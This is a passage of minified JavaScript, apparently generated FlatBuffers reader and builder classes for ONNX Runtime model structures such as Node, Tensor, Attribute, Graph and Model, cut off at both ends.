offset?this.bb.readInt32(this.bb_pos+offset):onnxruntime.experimental.fbs.NodeType.Primitive}executionProviderType(optionalEncoding){let offset=this.bb.__offset(this.bb_pos,18);return offset?this.bb.__string(this.bb_pos+offset,optionalEncoding):null}inputs(index,optionalEncoding){let offset=this.bb.__offset(this.bb_pos,20);return offset?this.bb.__string(this.bb.__vector(this.bb_pos+offset)+4*index,optionalEncoding):null}inputsLength(){let offset=this.bb.__offset(this.bb_pos,20);return offset?this.bb.__vector_len(this.bb_pos+offset):0}outputs(index,optionalEncoding){let offset=this.bb.__offset(this.bb_pos,22);return offset?this.bb.__string(this.bb.__vector(this.bb_pos+offset)+4*index,optionalEncoding):null}outputsLength(){let offset=this.bb.__offset(this.bb_pos,22);return offset?this.bb.__vector_len(this.bb_pos+offset):0}attributes(index,obj){let offset=this.bb.__offset(this.bb_pos,24);return offset?(obj||new onnxruntime.experimental.fbs.Attribute).__init(this.bb.__indirect(this.bb.__vector(this.bb_pos+offset)+4*index),this.bb):null}attributesLength(){let offset=this.bb.__offset(this.bb_pos,24);return offset?this.bb.__vector_len(this.bb_pos+offset):0}inputArgCounts(index){let offset=this.bb.__offset(this.bb_pos,26);return offset?this.bb.readInt32(this.bb.__vector(this.bb_pos+offset)+4*index):0}inputArgCountsLength(){let offset=this.bb.__offset(this.bb_pos,26);return offset?this.bb.__vector_len(this.bb_pos+offset):0}inputArgCountsArray(){let offset=this.bb.__offset(this.bb_pos,26);return offset?new Int32Array(this.bb.bytes().buffer,this.bb.bytes().byteOffset+this.bb.__vector(this.bb_pos+offset),this.bb.__vector_len(this.bb_pos+offset)):null}implicitInputs(index,optionalEncoding){let offset=this.bb.__offset(this.bb_pos,28);return offset?this.bb.__string(this.bb.__vector(this.bb_pos+offset)+4*index,optionalEncoding):null}implicitInputsLength(){let offset=this.bb.__offset(this.bb_pos,28);return offset?this.bb.__vector_len(this.bb_pos+offset):0}static startNode(builder){builder.startObject(13)}static addName(builder,nameOffset){builder.addFieldOffset(0,nameOffset,0)}static addDocString(builder,docStringOffset){builder.addFieldOffset(1,docStringOffset,0)}static addDomain(builder,domainOffset){builder.addFieldOffset(2,domainOffset,0)}static addSinceVersion(builder,sinceVersion){builder.addFieldInt32(3,sinceVersion,0)}static addIndex(builder,index){builder.addFieldInt32(4,index,0)}static addOpType(builder,opTypeOffset){builder.addFieldOffset(5,opTypeOffset,0)}static addType(builder,type){builder.addFieldInt32(6,type,onnxruntime.experimental.fbs.NodeType.Primitive)}static addExecutionProviderType(builder,executionProviderTypeOffset){builder.addFieldOffset(7,executionProviderTypeOffset,0)}static addInputs(builder,inputsOffset){builder.addFieldOffset(8,inputsOffset,0)}static createInputsVector(builder,data){builder.startVector(4,data.length,4);for(let i=data.length-1;i>=0;i--)builder.addOffset(data[i]);return builder.endVector()}static startInputsVector(builder,numElems){builder.startVector(4,numElems,4)}static addOutputs(builder,outputsOffset){builder.addFieldOffset(9,outputsOffset,0)}static createOutputsVector(builder,data){builder.startVector(4,data.length,4);for(let i=data.length-1;i>=0;i--)builder.addOffset(data[i]);return builder.endVector()}static startOutputsVector(builder,numElems){builder.startVector(4,numElems,4)}static addAttributes(builder,attributesOffset){builder.addFieldOffset(10,attributesOffset,0)}static createAttributesVector(builder,data){builder.startVector(4,data.length,4);for(let i=data.length-1;i>=0;i--)builder.addOffset(data[i]);return builder.endVector()}static startAttributesVector(builder,numElems){builder.startVector(4,numElems,4)}static addInputArgCounts(builder,inputArgCountsOffset){builder.addFieldOffset(11,inputArgCountsOffset,0)}static createInputArgCountsVector(builder,data){builder.startVector(4,data.length,4);for(let i=data.length-1;i>=0;i--)builder.addInt32(data[i]);return builder.endVector()}static startInputArgCountsVector(builder,numElems){builder.startVector(4,numElems,4)}static addImplicitInputs(builder,implicitInputsOffset){builder.addFieldOffset(12,implicitInputsOffset,0)}static createImplicitInputsVector(builder,data){builder.startVector(4,data.length,4);for(let i=data.length-1;i>=0;i--)builder.addOffset(data[i]);return builder.endVector()}static startImplicitInputsVector(builder,numElems){builder.startVector(4,numElems,4)}static endNode(builder){return builder.endObject()}static createNode(builder,nameOffset,docStringOffset,domainOffset,sinceVersion,index,opTypeOffset,type,executionProviderTypeOffset,inputsOffset,outputsOffset,attributesOffset,inputArgCountsOffset,implicitInputsOffset){return Node.startNode(builder),Node.addName(builder,nameOffset),Node.addDocString(builder,docStringOffset),Node.addDomain(builder,domainOffset),Node.addSinceVersion(builder,sinceVersion),Node.addIndex(builder,index),Node.addOpType(builder,opTypeOffset),Node.addType(builder,type),Node.addExecutionProviderType(builder,executionProviderTypeOffset),Node.addInputs(builder,inputsOffset),Node.addOutputs(builder,outputsOffset),Node.addAttributes(builder,attributesOffset),Node.addInputArgCounts(builder,inputArgCountsOffset),Node.addImplicitInputs(builder,implicitInputsOffset),Node.endNode(builder)}}fbs.Node=Node}(experimental.fbs||(experimental.fbs={}))}(onnxruntime.experimental||(onnxruntime.experimental={}))}(exports.onnxruntime||(exports.onnxruntime={})),function(onnxruntime){!function(experimental){!function(fbs){class ValueInfo{constructor(){this.bb=null,this.bb_pos=0}__init(i,bb){return this.bb_pos=i,this.bb=bb,this}static getRootAsValueInfo(bb,obj){return(obj||new ValueInfo).__init(bb.readInt32(bb.position())+bb.position(),bb)}static getSizePrefixedRootAsValueInfo(bb,obj){return bb.setPosition(bb.position()+flatbuffers_1.flatbuffers.SIZE_PREFIX_LENGTH),(obj||new ValueInfo).__init(bb.readInt32(bb.position())+bb.position(),bb)}name(optionalEncoding){let offset=this.bb.__offset(this.bb_pos,4);return offset?this.bb.__string(this.bb_pos+offset,optionalEncoding):null}docString(optionalEncoding){let offset=this.bb.__offset(this.bb_pos,6);return offset?this.bb.__string(this.bb_pos+offset,optionalEncoding):null}type(obj){let offset=this.bb.__offset(this.bb_pos,8);return offset?(obj||new onnxruntime.experimental.fbs.TypeInfo).__init(this.bb.__indirect(this.bb_pos+offset),this.bb):null}static startValueInfo(builder){builder.startObject(3)}static addName(builder,nameOffset){builder.addFieldOffset(0,nameOffset,0)}static addDocString(builder,docStringOffset){builder.addFieldOffset(1,docStringOffset,0)}static addType(builder,typeOffset){builder.addFieldOffset(2,typeOffset,0)}static endValueInfo(builder){return builder.endObject()}static createValueInfo(builder,nameOffset,docStringOffset,typeOffset){return ValueInfo.startValueInfo(builder),ValueInfo.addName(builder,nameOffset),ValueInfo.addDocString(builder,docStringOffset),ValueInfo.addType(builder,typeOffset),ValueInfo.endValueInfo(builder)}}fbs.ValueInfo=ValueInfo}(experimental.fbs||(experimental.fbs={}))}(onnxruntime.experimental||(onnxruntime.experimental={}))}(exports.onnxruntime||(exports.onnxruntime={})),function(onnxruntime){!function(experimental){!function(fbs){class TypeInfo{constructor(){this.bb=null,this.bb_pos=0}__init(i,bb){return this.bb_pos=i,this.bb=bb,this}static getRootAsTypeInfo(bb,obj){return(obj||new TypeInfo).__init(bb.readInt32(bb.position())+bb.position(),bb)}static getSizePrefixedRootAsTypeInfo(bb,obj){return bb.setPosition(bb.position()+flatbuffers_1.flatbuffers.SIZE_PREFIX_LENGTH),(obj||new TypeInfo).__init(bb.readInt32(bb.position())+bb.position(),bb)}denotation(optionalEncoding){let offset=this.bb.__offset(this.bb_pos,4);return offset?this.bb.__string(this.bb_pos+offset,optionalEncoding):null}valueType(){let offset=this.bb.__offset(this.bb_pos,6);return offset?this.bb.readUint8(this.bb_pos+offset):onnxruntime.experimental.fbs.TypeInfoValue.NONE}value(obj){let offset=this.bb.__offset(this.bb_pos,8);return offset?this.bb.__union(obj,this.bb_pos+offset):null}static startTypeInfo(builder){builder.startObject(3)}static addDenotation(builder,denotationOffset){builder.addFieldOffset(0,denotationOffset,0)}static addValueType(builder,valueType){builder.addFieldInt8(1,valueType,onnxruntime.experimental.fbs.TypeInfoValue.NONE)}static addValue(builder,valueOffset){builder.addFieldOffset(2,valueOffset,0)}static endTypeInfo(builder){return builder.endObject()}static createTypeInfo(builder,denotationOffset,valueType,valueOffset){return TypeInfo.startTypeInfo(builder),TypeInfo.addDenotation(builder,denotationOffset),TypeInfo.addValueType(builder,valueType),TypeInfo.addValue(builder,valueOffset),TypeInfo.endTypeInfo(builder)}}fbs.TypeInfo=TypeInfo}(experimental.fbs||(experimental.fbs={}))}(onnxruntime.experimental||(onnxruntime.experimental={}))}(exports.onnxruntime||(exports.onnxruntime={})),function(onnxruntime){!function(experimental){!function(fbs){class OperatorSetId{constructor(){this.bb=null,this.bb_pos=0}__init(i,bb){return this.bb_pos=i,this.bb=bb,this}static getRootAsOperatorSetId(bb,obj){return(obj||new OperatorSetId).__init(bb.readInt32(bb.position())+bb.position(),bb)}static getSizePrefixedRootAsOperatorSetId(bb,obj){return bb.setPosition(bb.position()+flatbuffers_1.flatbuffers.SIZE_PREFIX_LENGTH),(obj||new OperatorSetId).__init(bb.readInt32(bb.position())+bb.position(),bb)}domain(optionalEncoding){let offset=this.bb.__offset(this.bb_pos,4);return offset?this.bb.__string(this.bb_pos+offset,optionalEncoding):null}version(){let offset=this.bb.__offset(this.bb_pos,6);return offset?this.bb.readInt64(this.bb_pos+offset):this.bb.createLong(0,0)}static startOperatorSetId(builder){builder.startObject(2)}static addDomain(builder,domainOffset){builder.addFieldOffset(0,domainOffset,0)}static addVersion(builder,version){builder.addFieldInt64(1,version,builder.createLong(0,0))}static endOperatorSetId(builder){return builder.endObject()}static createOperatorSetId(builder,domainOffset,version){return OperatorSetId.startOperatorSetId(builder),OperatorSetId.addDomain(builder,domainOffset),OperatorSetId.addVersion(builder,version),OperatorSetId.endOperatorSetId(builder)}}fbs.OperatorSetId=OperatorSetId}(experimental.fbs||(experimental.fbs={}))}(onnxruntime.experimental||(onnxruntime.experimental={}))}(exports.onnxruntime||(exports.onnxruntime={})),function(onnxruntime){!function(experimental){!function(fbs){class Tensor{constructor(){this.bb=null,this.bb_pos=0}__init(i,bb){return this.bb_pos=i,this.bb=bb,this}static getRootAsTensor(bb,obj){return(obj||new Tensor).__init(bb.readInt32(bb.position())+bb.position(),bb)}static getSizePrefixedRootAsTensor(bb,obj){return bb.setPosition(bb.position()+flatbuffers_1.flatbuffers.SIZE_PREFIX_LENGTH),(obj||new Tensor).__init(bb.readInt32(bb.position())+bb.position(),bb)}name(optionalEncoding){let offset=this.bb.__offset(this.bb_pos,4);return offset?this.bb.__string(this.bb_pos+offset,optionalEncoding):null}docString(optionalEncoding){let offset=this.bb.__offset(this.bb_pos,6);return offset?this.bb.__string(this.bb_pos+offset,optionalEncoding):null}dims(index){let offset=this.bb.__offset(this.bb_pos,8);return offset?this.bb.readInt64(this.bb.__vector(this.bb_pos+offset)+8*index):this.bb.createLong(0,0)}dimsLength(){let offset=this.bb.__offset(this.bb_pos,8);return offset?this.bb.__vector_len(this.bb_pos+offset):0}dataType(){let offset=this.bb.__offset(this.bb_pos,10);return offset?this.bb.readInt32(this.bb_pos+offset):onnxruntime.experimental.fbs.TensorDataType.UNDEFINED}rawData(index){let offset=this.bb.__offset(this.bb_pos,12);return offset?this.bb.readUint8(this.bb.__vector(this.bb_pos+offset)+index):0}rawDataLength(){let offset=this.bb.__offset(this.bb_pos,12);return offset?this.bb.__vector_len(this.bb_pos+offset):0}rawDataArray(){let offset=this.bb.__offset(this.bb_pos,12);return offset?new Uint8Array(this.bb.bytes().buffer,this.bb.bytes().byteOffset+this.bb.__vector(this.bb_pos+offset),this.bb.__vector_len(this.bb_pos+offset)):null}stringData(index,optionalEncoding){let offset=this.bb.__offset(this.bb_pos,14);return offset?this.bb.__string(this.bb.__vector(this.bb_pos+offset)+4*index,optionalEncoding):null}stringDataLength(){let offset=this.bb.__offset(this.bb_pos,14);return offset?this.bb.__vector_len(this.bb_pos+offset):0}static startTensor(builder){builder.startObject(6)}static addName(builder,nameOffset){builder.addFieldOffset(0,nameOffset,0)}static addDocString(builder,docStringOffset){builder.addFieldOffset(1,docStringOffset,0)}static addDims(builder,dimsOffset){builder.addFieldOffset(2,dimsOffset,0)}static createDimsVector(builder,data){builder.startVector(8,data.length,8);for(let i=data.length-1;i>=0;i--)builder.addInt64(data[i]);return builder.endVector()}static startDimsVector(builder,numElems){builder.startVector(8,numElems,8)}static addDataType(builder,dataType){builder.addFieldInt32(3,dataType,onnxruntime.experimental.fbs.TensorDataType.UNDEFINED)}static addRawData(builder,rawDataOffset){builder.addFieldOffset(4,rawDataOffset,0)}static createRawDataVector(builder,data){builder.startVector(1,data.length,1);for(let i=data.length-1;i>=0;i--)builder.addInt8(data[i]);return builder.endVector()}static startRawDataVector(builder,numElems){builder.startVector(1,numElems,1)}static addStringData(builder,stringDataOffset){builder.addFieldOffset(5,stringDataOffset,0)}static createStringDataVector(builder,data){builder.startVector(4,data.length,4);for(let i=data.length-1;i>=0;i--)builder.addOffset(data[i]);return builder.endVector()}static startStringDataVector(builder,numElems){builder.startVector(4,numElems,4)}static endTensor(builder){return builder.endObject()}static createTensor(builder,nameOffset,docStringOffset,dimsOffset,dataType,rawDataOffset,stringDataOffset){return Tensor.startTensor(builder),Tensor.addName(builder,nameOffset),Tensor.addDocString(builder,docStringOffset),Tensor.addDims(builder,dimsOffset),Tensor.addDataType(builder,dataType),Tensor.addRawData(builder,rawDataOffset),Tensor.addStringData(builder,stringDataOffset),Tensor.endTensor(builder)}}fbs.Tensor=Tensor}(experimental.fbs||(experimental.fbs={}))}(onnxruntime.experimental||(onnxruntime.experimental={}))}(exports.onnxruntime||(exports.onnxruntime={})),function(onnxruntime){!function(experimental){!function(fbs){class SparseTensor{constructor(){this.bb=null,this.bb_pos=0}__init(i,bb){return this.bb_pos=i,this.bb=bb,this}static getRootAsSparseTensor(bb,obj){return(obj||new SparseTensor).__init(bb.readInt32(bb.position())+bb.position(),bb)}static getSizePrefixedRootAsSparseTensor(bb,obj){return bb.setPosition(bb.position()+flatbuffers_1.flatbuffers.SIZE_PREFIX_LENGTH),(obj||new SparseTensor).__init(bb.readInt32(bb.position())+bb.position(),bb)}values(obj){let offset=this.bb.__offset(this.bb_pos,4);return offset?(obj||new onnxruntime.experimental.fbs.Tensor).__init(this.bb.__indirect(this.bb_pos+offset),this.bb):null}indices(obj){let offset=this.bb.__offset(this.bb_pos,6);return offset?(obj||new onnxruntime.experimental.fbs.Tensor).__init(this.bb.__indirect(this.bb_pos+offset),this.bb):null}dims(index){let offset=this.bb.__offset(this.bb_pos,8);return offset?this.bb.readInt64(this.bb.__vector(this.bb_pos+offset)+8*index):this.bb.createLong(0,0)}dimsLength(){let offset=this.bb.__offset(this.bb_pos,8);return offset?this.bb.__vector_len(this.bb_pos+offset):0}static startSparseTensor(builder){builder.startObject(3)}static addValues(builder,valuesOffset){builder.addFieldOffset(0,valuesOffset,0)}static addIndices(builder,indicesOffset){builder.addFieldOffset(1,indicesOffset,0)}static addDims(builder,dimsOffset){builder.addFieldOffset(2,dimsOffset,0)}static createDimsVector(builder,data){builder.startVector(8,data.length,8);for(let i=data.length-1;i>=0;i--)builder.addInt64(data[i]);return builder.endVector()}static startDimsVector(builder,numElems){builder.startVector(8,numElems,8)}static endSparseTensor(builder){return builder.endObject()}static createSparseTensor(builder,valuesOffset,indicesOffset,dimsOffset){return SparseTensor.startSparseTensor(builder),SparseTensor.addValues(builder,valuesOffset),SparseTensor.addIndices(builder,indicesOffset),SparseTensor.addDims(builder,dimsOffset),SparseTensor.endSparseTensor(builder)}}fbs.SparseTensor=SparseTensor}(experimental.fbs||(experimental.fbs={}))}(onnxruntime.experimental||(onnxruntime.experimental={}))}(exports.onnxruntime||(exports.onnxruntime={})),function(onnxruntime){!function(experimental){!function(fbs){class Attribute{constructor(){this.bb=null,this.bb_pos=0}__init(i,bb){return this.bb_pos=i,this.bb=bb,this}static getRootAsAttribute(bb,obj){return(obj||new Attribute).__init(bb.readInt32(bb.position())+bb.position(),bb)}static getSizePrefixedRootAsAttribute(bb,obj){return bb.setPosition(bb.position()+flatbuffers_1.flatbuffers.SIZE_PREFIX_LENGTH),(obj||new Attribute).__init(bb.readInt32(bb.position())+bb.position(),bb)}name(optionalEncoding){let offset=this.bb.__offset(this.bb_pos,4);return offset?this.bb.__string(this.bb_pos+offset,optionalEncoding):null}docString(optionalEncoding){let offset=this.bb.__offset(this.bb_pos,6);return offset?this.bb.__string(this.bb_pos+offset,optionalEncoding):null}type(){let offset=this.bb.__offset(this.bb_pos,8);return offset?this.bb.readInt32(this.bb_pos+offset):onnxruntime.experimental.fbs.AttributeType.UNDEFINED}f(){let offset=this.bb.__offset(this.bb_pos,10);return offset?this.bb.readFloat32(this.bb_pos+offset):0}i(){let offset=this.bb.__offset(this.bb_pos,12);return offset?this.bb.readInt64(this.bb_pos+offset):this.bb.createLong(0,0)}s(optionalEncoding){let offset=this.bb.__offset(this.bb_pos,14);return offset?this.bb.__string(this.bb_pos+offset,optionalEncoding):null}t(obj){let offset=this.bb.__offset(this.bb_pos,16);return offset?(obj||new onnxruntime.experimental.fbs.Tensor).__init(this.bb.__indirect(this.bb_pos+offset),this.bb):null}g(obj){let offset=this.bb.__offset(this.bb_pos,18);return offset?(obj||new onnxruntime.experimental.fbs.Graph).__init(this.bb.__indirect(this.bb_pos+offset),this.bb):null}floats(index){let offset=this.bb.__offset(this.bb_pos,20);return offset?this.bb.readFloat32(this.bb.__vector(this.bb_pos+offset)+4*index):0}floatsLength(){let offset=this.bb.__offset(this.bb_pos,20);return offset?this.bb.__vector_len(this.bb_pos+offset):0}floatsArray(){let offset=this.bb.__offset(this.bb_pos,20);return offset?new Float32Array(this.bb.bytes().buffer,this.bb.bytes().byteOffset+this.bb.__vector(this.bb_pos+offset),this.bb.__vector_len(this.bb_pos+offset)):null}ints(index){let offset=this.bb.__offset(this.bb_pos,22);return offset?this.bb.readInt64(this.bb.__vector(this.bb_pos+offset)+8*index):this.bb.createLong(0,0)}intsLength(){let offset=this.bb.__offset(this.bb_pos,22);return offset?this.bb.__vector_len(this.bb_pos+offset):0}strings(index,optionalEncoding){let offset=this.bb.__offset(this.bb_pos,24);return offset?this.bb.__string(this.bb.__vector(this.bb_pos+offset)+4*index,optionalEncoding):null}stringsLength(){let offset=this.bb.__offset(this.bb_pos,24);return offset?this.bb.__vector_len(this.bb_pos+offset):0}tensors(index,obj){let offset=this.bb.__offset(this.bb_pos,26);return offset?(obj||new onnxruntime.experimental.fbs.Tensor).__init(this.bb.__indirect(this.bb.__vector(this.bb_pos+offset)+4*index),this.bb):null}tensorsLength(){let offset=this.bb.__offset(this.bb_pos,26);return offset?this.bb.__vector_len(this.bb_pos+offset):0}graphs(index,obj){let offset=this.bb.__offset(this.bb_pos,28);return offset?(obj||new onnxruntime.experimental.fbs.Graph).__init(this.bb.__indirect(this.bb.__vector(this.bb_pos+offset)+4*index),this.bb):null}graphsLength(){let offset=this.bb.__offset(this.bb_pos,28);return offset?this.bb.__vector_len(this.bb_pos+offset):0}static startAttribute(builder){builder.startObject(13)}static addName(builder,nameOffset){builder.addFieldOffset(0,nameOffset,0)}static addDocString(builder,docStringOffset){builder.addFieldOffset(1,docStringOffset,0)}static addType(builder,type){builder.addFieldInt32(2,type,onnxruntime.experimental.fbs.AttributeType.UNDEFINED)}static addF(builder,f){builder.addFieldFloat32(3,f,0)}static addI(builder,i){builder.addFieldInt64(4,i,builder.createLong(0,0))}static addS(builder,sOffset){builder.addFieldOffset(5,sOffset,0)}static addT(builder,tOffset){builder.addFieldOffset(6,tOffset,0)}static addG(builder,gOffset){builder.addFieldOffset(7,gOffset,0)}static addFloats(builder,floatsOffset){builder.addFieldOffset(8,floatsOffset,0)}static createFloatsVector(builder,data){builder.startVector(4,data.length,4);for(let i=data.length-1;i>=0;i--)builder.addFloat32(data[i]);return builder.endVector()}static startFloatsVector(builder,numElems){builder.startVector(4,numElems,4)}static addInts(builder,intsOffset){builder.addFieldOffset(9,intsOffset,0)}static createIntsVector(builder,data){builder.startVector(8,data.length,8);for(let i=data.length-1;i>=0;i--)builder.addInt64(data[i]);return builder.endVector()}static startIntsVector(builder,numElems){builder.startVector(8,numElems,8)}static addStrings(builder,stringsOffset){builder.addFieldOffset(10,stringsOffset,0)}static createStringsVector(builder,data){builder.startVector(4,data.length,4);for(let i=data.length-1;i>=0;i--)builder.addOffset(data[i]);return builder.endVector()}static startStringsVector(builder,numElems){builder.startVector(4,numElems,4)}static addTensors(builder,tensorsOffset){builder.addFieldOffset(11,tensorsOffset,0)}static createTensorsVector(builder,data){builder.startVector(4,data.length,4);for(let i=data.length-1;i>=0;i--)builder.addOffset(data[i]);return builder.endVector()}static startTensorsVector(builder,numElems){builder.startVector(4,numElems,4)}static addGraphs(builder,graphsOffset){builder.addFieldOffset(12,graphsOffset,0)}static createGraphsVector(builder,data){builder.startVector(4,data.length,4);for(let i=data.length-1;i>=0;i--)builder.addOffset(data[i]);return builder.endVector()}static startGraphsVector(builder,numElems){builder.startVector(4,numElems,4)}static endAttribute(builder){return builder.endObject()}static createAttribute(builder,nameOffset,docStringOffset,type,f,i,sOffset,tOffset,gOffset,floatsOffset,intsOffset,stringsOffset,tensorsOffset,graphsOffset){return Attribute.startAttribute(builder),Attribute.addName(builder,nameOffset),Attribute.addDocString(builder,docStringOffset),Attribute.addType(builder,type),Attribute.addF(builder,f),Attribute.addI(builder,i),Attribute.addS(builder,sOffset),Attribute.addT(builder,tOffset),Attribute.addG(builder,gOffset),Attribute.addFloats(builder,floatsOffset),Attribute.addInts(builder,intsOffset),Attribute.addStrings(builder,stringsOffset),Attribute.addTensors(builder,tensorsOffset),Attribute.addGraphs(builder,graphsOffset),Attribute.endAttribute(builder)}}fbs.Attribute=Attribute}(experimental.fbs||(experimental.fbs={}))}(onnxruntime.experimental||(onnxruntime.experimental={}))}(exports.onnxruntime||(exports.onnxruntime={})),function(onnxruntime){!function(experimental){!function(fbs){class Graph{constructor(){this.bb=null,this.bb_pos=0}__init(i,bb){return this.bb_pos=i,this.bb=bb,this}static getRootAsGraph(bb,obj){return(obj||new Graph).__init(bb.readInt32(bb.position())+bb.position(),bb)}static getSizePrefixedRootAsGraph(bb,obj){return bb.setPosition(bb.position()+flatbuffers_1.flatbuffers.SIZE_PREFIX_LENGTH),(obj||new Graph).__init(bb.readInt32(bb.position())+bb.position(),bb)}initializers(index,obj){let offset=this.bb.__offset(this.bb_pos,4);return offset?(obj||new onnxruntime.experimental.fbs.Tensor).__init(this.bb.__indirect(this.bb.__vector(this.bb_pos+offset)+4*index),this.bb):null}initializersLength(){let offset=this.bb.__offset(this.bb_pos,4);return offset?this.bb.__vector_len(this.bb_pos+offset):0}nodeArgs(index,obj){let offset=this.bb.__offset(this.bb_pos,6);return offset?(obj||new onnxruntime.experimental.fbs.ValueInfo).__init(this.bb.__indirect(this.bb.__vector(this.bb_pos+offset)+4*index),this.bb):null}nodeArgsLength(){let offset=this.bb.__offset(this.bb_pos,6);return offset?this.bb.__vector_len(this.bb_pos+offset):0}nodes(index,obj){let offset=this.bb.__offset(this.bb_pos,8);return offset?(obj||new onnxruntime.experimental.fbs.Node).__init(this.bb.__indirect(this.bb.__vector(this.bb_pos+offset)+4*index),this.bb):null}nodesLength(){let offset=this.bb.__offset(this.bb_pos,8);return offset?this.bb.__vector_len(this.bb_pos+offset):0}maxNodeIndex(){let offset=this.bb.__offset(this.bb_pos,10);return offset?this.bb.readUint32(this.bb_pos+offset):0}nodeEdges(index,obj){let offset=this.bb.__offset(this.bb_pos,12);return offset?(obj||new onnxruntime.experimental.fbs.NodeEdge).__init(this.bb.__indirect(this.bb.__vector(this.bb_pos+offset)+4*index),this.bb):null}nodeEdgesLength(){let offset=this.bb.__offset(this.bb_pos,12);return offset?this.bb.__vector_len(this.bb_pos+offset):0}inputs(index,optionalEncoding){let offset=this.bb.__offset(this.bb_pos,14);return offset?this.bb.__string(this.bb.__vector(this.bb_pos+offset)+4*index,optionalEncoding):null}inputsLength(){let offset=this.bb.__offset(this.bb_pos,14);return offset?this.bb.__vector_len(this.bb_pos+offset):0}outputs(index,optionalEncoding){let offset=this.bb.__offset(this.bb_pos,16);return offset?this.bb.__string(this.bb.__vector(this.bb_pos+offset)+4*index,optionalEncoding):null}outputsLength(){let offset=this.bb.__offset(this.bb_pos,16);return offset?this.bb.__vector_len(this.bb_pos+offset):0}sparseInitializers(index,obj){let offset=this.bb.__offset(this.bb_pos,18);return offset?(obj||new onnxruntime.experimental.fbs.SparseTensor).__init(this.bb.__indirect(this.bb.__vector(this.bb_pos+offset)+4*index),this.bb):null}sparseInitializersLength(){let offset=this.bb.__offset(this.bb_pos,18);return offset?this.bb.__vector_len(this.bb_pos+offset):0}static startGraph(builder){builder.startObject(8)}static addInitializers(builder,initializersOffset){builder.addFieldOffset(0,initializersOffset,0)}static createInitializersVector(builder,data){builder.startVector(4,data.length,4);for(let i=data.length-1;i>=0;i--)builder.addOffset(data[i]);return builder.endVector()}static startInitializersVector(builder,numElems){builder.startVector(4,numElems,4)}static addNodeArgs(builder,nodeArgsOffset){builder.addFieldOffset(1,nodeArgsOffset,0)}static createNodeArgsVector(builder,data){builder.startVector(4,data.length,4);for(let i=data.length-1;i>=0;i--)builder.addOffset(data[i]);return builder.endVector()}static startNodeArgsVector(builder,numElems){builder.startVector(4,numElems,4)}static addNodes(builder,nodesOffset){builder.addFieldOffset(2,nodesOffset,0)}static createNodesVector(builder,data){builder.startVector(4,data.length,4);for(let i=data.length-1;i>=0;i--)builder.addOffset(data[i]);return builder.endVector()}static startNodesVector(builder,numElems){builder.startVector(4,numElems,4)}static addMaxNodeIndex(builder,maxNodeIndex){builder.addFieldInt32(3,maxNodeIndex,0)}static addNodeEdges(builder,nodeEdgesOffset){builder.addFieldOffset(4,nodeEdgesOffset,0)}static createNodeEdgesVector(builder,data){builder.startVector(4,data.length,4);for(let i=data.length-1;i>=0;i--)builder.addOffset(data[i]);return builder.endVector()}static startNodeEdgesVector(builder,numElems){builder.startVector(4,numElems,4)}static addInputs(builder,inputsOffset){builder.addFieldOffset(5,inputsOffset,0)}static createInputsVector(builder,data){builder.startVector(4,data.length,4);for(let i=data.length-1;i>=0;i--)builder.addOffset(data[i]);return builder.endVector()}static startInputsVector(builder,numElems){builder.startVector(4,numElems,4)}static addOutputs(builder,outputsOffset){builder.addFieldOffset(6,outputsOffset,0)}static createOutputsVector(builder,data){builder.startVector(4,data.length,4);for(let i=data.length-1;i>=0;i--)builder.addOffset(data[i]);return builder.endVector()}static startOutputsVector(builder,numElems){builder.startVector(4,numElems,4)}static addSparseInitializers(builder,sparseInitializersOffset){builder.addFieldOffset(7,sparseInitializersOffset,0)}static createSparseInitializersVector(builder,data){builder.startVector(4,data.length,4);for(let i=data.length-1;i>=0;i--)builder.addOffset(data[i]);return builder.endVector()}static startSparseInitializersVector(builder,numElems){builder.startVector(4,numElems,4)}static endGraph(builder){return builder.endObject()}static createGraph(builder,initializersOffset,nodeArgsOffset,nodesOffset,maxNodeIndex,nodeEdgesOffset,inputsOffset,outputsOffset,sparseInitializersOffset){return Graph.startGraph(builder),Graph.addInitializers(builder,initializersOffset),Graph.addNodeArgs(builder,nodeArgsOffset),Graph.addNodes(builder,nodesOffset),Graph.addMaxNodeIndex(builder,maxNodeIndex),Graph.addNodeEdges(builder,nodeEdgesOffset),Graph.addInputs(builder,inputsOffset),Graph.addOutputs(builder,outputsOffset),Graph.addSparseInitializers(builder,sparseInitializersOffset),Graph.endGraph(builder)}}fbs.Graph=Graph}(experimental.fbs||(experimental.fbs={}))}(onnxruntime.experimental||(onnxruntime.experimental={}))}(exports.onnxruntime||(exports.onnxruntime={})),function(onnxruntime){!function(experimental){!function(fbs){class Model{constructor(){this.bb=null,this.bb_pos=0}__init(i,bb){return this.bb_pos=i,this.bb=bb,this}static getRootAsModel(bb,obj){return(obj||new Model).__init(bb.readInt32(bb.position())+bb.position(),bb)}static getSizePrefixedRootAsModel(bb,obj){return bb.setPosition(bb.position()+flatbuffers_1.flatbuffers.SIZE_PREFIX_LENGTH),(obj||new Model).__init(bb.readInt32(bb.position())+bb.position(),bb)}irVersion(){let offset=this.bb.__offset(this.bb_pos,4);return offset?this.bb.readInt64(this.bb_pos+offset):this.bb.createLong(0,0)}opsetImport(index,obj){let offset=this.bb.__offset(this.bb_pos,6);return offset?(obj||new onnxruntime.experimental.fbs.OperatorSetId).__init(this.bb.__indirect(this.bb.__vector(this.bb_pos+offset)+4*index),this.bb):null}opsetImportLength(){let offset=this.bb.__offset(this.bb_pos,6);return offset?this.bb.__vector_len(this.bb_pos+offset):0}producerName(optionalEncoding){let offset=this.bb.__offset(this.bb_pos,8);return offset?this.bb.__string(this.bb_pos+offset,optionalEncoding):null}producerVersion(optionalEncoding){let offset=this.bb.__offset(this.bb_pos,10);return offset?this.bb.__string(this.bb_pos+offset,optionalEncoding):null}domain(optionalEncoding){let offset=this.bb.__offset(this.bb_pos,12);return offset?this.bb.__string(this.bb_pos+offset,optionalEncoding):null}modelVersion(){let offset=this.bb.__offset(this.bb_pos,14);return offset?this.bb.readInt64(this.bb_pos+offset):this.bb.createLong(0,0)}docString(optionalEncoding){let offset=this.bb.__offset(this.bb_pos,16);return offset?this.bb.__string(this.bb_pos+offset,optionalEncoding):null}graph(obj){let offset=this.bb.__offset(this.bb_pos,18);return offset?(obj||new onnxruntime.experimental.fbs.Graph).__init(this.bb.__indirect(this.bb_pos+offset),this.bb):null}graphDocString(optionalEncoding){let offset=this.bb.__offset(this.bb_pos,20);return offset?this.bb.__string(this.bb_pos+offset,optionalEncoding):null}static startModel(builder){builder.startObject(9)}static addIrVersion(builder,irVersion){builder.addFieldInt64(0,irVersion,builder.createLong(0,0))}static addOpsetImport(builder,opsetImportOffset){builder.addFieldOffset(1,opsetImportOffset,0)}static createOpsetImportVector(builder,data){builder.startVector(4,data.length,4);for(let 